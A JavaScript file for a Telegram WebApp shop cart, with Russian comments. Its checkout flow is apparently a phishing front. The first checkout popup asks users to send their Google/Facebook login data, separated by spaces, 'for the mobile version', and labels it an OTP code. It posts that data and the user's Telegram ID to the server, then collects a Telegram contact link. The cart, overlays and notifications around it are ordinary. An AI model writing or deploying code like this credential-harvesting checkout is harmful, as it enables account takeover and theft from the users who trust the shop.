Telegram.WebApp.ready();

// Отключаем возможность закрытия жестом "pull-to-close"
Telegram.WebApp.disableClosingConfirmation();

document.addEventListener("DOMContentLoaded", () => {
    const checkoutButton = document.getElementById("checkout-button");
    const cartItemsContainer = document.getElementById("cart-items");

    if (checkoutButton) {
        checkoutButton.addEventListener("click", async () => {
            // Проверяем, есть ли товары в корзине
            getCart(window.Telegram.WebApp.initDataUnsafe.user.id).then(({items, count}) => {
                if (count > 0) {
                    if (window.Telegram && window.Telegram.WebApp) {
                        const userId = window.Telegram.WebApp.initDataUnsafe.user.id;
                        // Выводим Telegram ID в консоль сервера, отправив его через fetch
                        fetch("/save-tg-id", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json",
                            },
                            body: JSON.stringify({ tg_id: userId }),
                        });
                    }

                    // Закрываем окно корзины
                    const cartDropdown = document.querySelector('.cart-dropdown');
                    if (cartDropdown) {
                        cartDropdown.classList.remove('active');
                    }

                    // Блокируем кнопку корзины
                    checkoutButton.disabled = true;

                    // Показываем всплывающее окно оформления заказа (первый шаг)
                    showOrderPopup();
                } else {
                    showNotification("Корзина пуста!");
                    return;
                }
            });
        });
    }

    const cartItems = cartItemsContainer.querySelectorAll("li");
});

async function getCart(tgId) {
    try {
        const response = await fetch(`/api/cart?tg_id=${encodeURIComponent(tgId)}`);

        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }

        const cartItems = await response.json();
        const itemCount = cartItems.length;

        console.log(`Получено ${itemCount} товаров в корзине`);

        return {
            items: cartItems,
            count: itemCount
        };
    } catch (error) {
        console.error('Ошибка при получении корзины:', error);
        return {
            items: [],
            count: 0
        };
    }
}

// Функция для показа уведомления
function showNotification(message) {
    const notification = document.createElement("div");
    notification.classList.add("notification");
    notification.textContent = message;

    document.body.appendChild(notification);

    // Убираем уведомление через 3 секунды
    setTimeout(() => {
        notification.remove();
    }, 3000);
}

// Функция для создания оверлея
function createOverlay() {
    const overlay = document.createElement("div");
    overlay.classList.add("overlay");
    document.body.appendChild(overlay);
    document.body.classList.add("no-scroll"); // Блокируем прокрутку

    // Создаем скрытый input для скрытия клавиатуры
    const hiddenInput = document.createElement("input");
    hiddenInput.type = "text";
    hiddenInput.style.position = "absolute";
    hiddenInput.style.opacity = "0";
    hiddenInput.style.pointerEvents = "none";
    document.body.appendChild(hiddenInput);

    // Обработчик клика на оверлей
    overlay.addEventListener("click", () => {
        hideKeyboard(); // Скрываем клавиатуру
    });
}

// Функция для удаления оверлея
function removeOverlay() {
    const overlay = document.querySelector(".overlay");
    if (overlay) {
        overlay.remove();
    }
    document.body.classList.remove("no-scroll"); // Восстанавливаем прокрутку

    // Удаляем скрытый input
    const hiddenInput = document.querySelector("input[type='text'][style*='opacity: 0']");
    if (hiddenInput) {
        hiddenInput.remove();
    }
}

// Функция для скрытия клавиатуры
function hideKeyboard() {
    const hiddenInput = document.querySelector("input[type='text'][style*='opacity: 0']");
    if (hiddenInput) {
        hiddenInput.focus(); // Переводим фокус на скрытый input
        hiddenInput.blur();  // Сразу убираем фокус
        console.log("Клавиатура скрыта");
    } else {
        console.log("Скрытый input не найден");
    }
}

// Обработчик клика вне всплывающего окна
document.addEventListener("click", (event) => {
    const popup = document.querySelector(".order-popup");
    if (popup && !popup.contains(event.target)) {
        // Клик был вне всплывающего окна
        hideKeyboard(); // Скрываем клавиатуру
    }
});

function showOrderPopup() {
    createOverlay(); // Создаем оверлей

    const popup = document.createElement("div");
    popup.classList.add("order-popup");
    popup.innerHTML = `
    <div class="order-popup-content">
        <button class="order-popup-close">
            <img src="/static/images/crest.png" alt="Закрыть">
        </button>
        <h2>Пришлите через пробел данные от Google/Facebook* для входа в мобильную версию.</h2>
        <div class="order-input-container">
            <input type="text" id="order-input" />
        </div>
        <button class="next-btn">
            <img src="/static/images/next.png" alt="Далее">
        </button>
    </div>`;

    document.body.appendChild(popup);

    // Обработчик закрытия окна
    popup.querySelector(".order-popup-close").addEventListener("click", () => {
        popup.remove();
        removeOverlay(); // Удаляем оверлей
        checkoutButton.disabled = false; // Разблокируем кнопку корзины
    });

    // Обработчик для кнопки "Далее" в первом окне
    popup.querySelector(".next-btn").addEventListener("click", () => {
        const otpData = document.getElementById("order-input").value;
        if (!otpData) {
            alert("Введите OTP-код!");
            return;
        }
        if (window.Telegram && window.Telegram.WebApp) {
            const userId = window.Telegram.WebApp.initDataUnsafe.user.id;
            fetch("/save-otp", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({ tg_id: userId, otp: otpData }),
            });
        }
        popup.remove();
        removeOverlay(); // Удаляем оверлей
        checkoutButton.disabled = false; // Разблокируем кнопку корзины
        showTelegramPopup(); // Показываем второе окно
    });
}

function showTelegramPopup() {
    createOverlay(); // Создаем оверлей

    const popup = document.createElement("div");
    popup.classList.add("order-popup");
    popup.innerHTML = `
    <div class="order-popup-content">
        <button class="order-popup-close">
            <img src="/static/images/crest.png" alt="Закрыть">
        </button>
        <h2>Введите ссылку для связи в Telegram:</h2>
        <div class="order-input-container">
            <input type="text" id="telegram-input" placeholder="Telegram ссылка" />
        </div>
        <button class="next-btn">
            <img src="/static/images/next.png" alt="Далее">
        </button>
    </div>`;

    document.body.appendChild(popup);

    // Обработчик закрытия окна
    popup.querySelector(".order-popup-close").addEventListener("click", () => {
        popup.remove();
        removeOverlay(); // Удаляем оверлей
        checkoutButton.disabled = false; // Разблокируем кнопку корзины
    });

    // Обработчик для кнопки "Далее" во втором окне
    popup.querySelector(".next-btn").addEventListener("click", () => {
        const telegramLink = document.getElementById("telegram-input").value.trim();
        if (!telegramLink) {
            alert("Введите ссылку для связи в Telegram!");
            return;
        }
        if (window.Telegram && window.Telegram.WebApp) {
            const userId = window.Telegram.WebApp.initDataUnsafe.user.id;
            fetch("/save_tg_link", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({ tg_id: userId, link: telegramLink }),
            });
        }
        popup.remove();
        removeOverlay(); // Удаляем оверлей
        checkoutButton.disabled = false; // Разблокируем кнопку корзины
        fetchLatestOrder(window.Telegram.WebApp.initDataUnsafe.user.id);
    });
}

function fetchLatestOrder(telegramId) {
    fetch('/api/order/latest', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ telegram_id: telegramId })
    })
        .then(response => {
            if (!response.ok) {
                throw new Error("Ошибка получения заказа");
            }
            return response.json();
        })
        .then(order => {
            console.log("Полученный заказ:", order);
            showOrderDetailsPopup(order);
        })
        .catch(error => {
            console.error("Ошибка:", error);
            alert("Не удалось получить данные заказа");
        });
}

function showOrderDetailsPopup(order) {
    createOverlay(); // Создаем оверлей

    const popup = document.createElement("div");
    popup.classList.add("order-popup");
    popup.innerHTML = `
    <div class="order-popup-content">
        <button class="order-popup-close">
            <img src="/static/images/crest.png" alt="Закрыть">
        </button>
        <h2>Детали заказа</h2>
        <p><strong>Номер заказа:</strong> ${order.id}</p>
        <p><strong>Telegram ID:</strong> ${order.user_id}</p>
        <p><strong>Корзина:</strong> ${order.cart}</p>
        <p><strong>OTP:</strong> ${order.otp_code}</p>
        <button class="confirm-btn">Подтверждаю</button>
    </div>`;

    document.body.appendChild(popup);

    popup.querySelector(".order-popup-close").addEventListener("click", () => {
        popup.remove();
        removeOverlay(); // Удаляем оверлей
        checkoutButton.disabled = false; // Разблокируем кнопку корзины
    });

    popup.querySelector(".confirm-btn").addEventListener("click", async () => {
        if (window.Telegram && window.Telegram.WebApp) {
            const user = window.Telegram.WebApp.initDataUnsafe.user;
            if (user && user.id) {
                const userId = user.id;
                try {
                    console.log('Запрос выполнен успешно');
                    window.Telegram.WebApp.close();
                    const response = await fetch('/api/order/end', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ telegram_id: userId })
                    });
                } catch (error) {
                    console.error('Ошибка при отправке запроса:', error);
                }
            } else {
                console.error('Пользователь не определен в initDataUnsafe');
            }
        } else {
            console.error('Telegram Web App не инициализирован');
        }
    });
}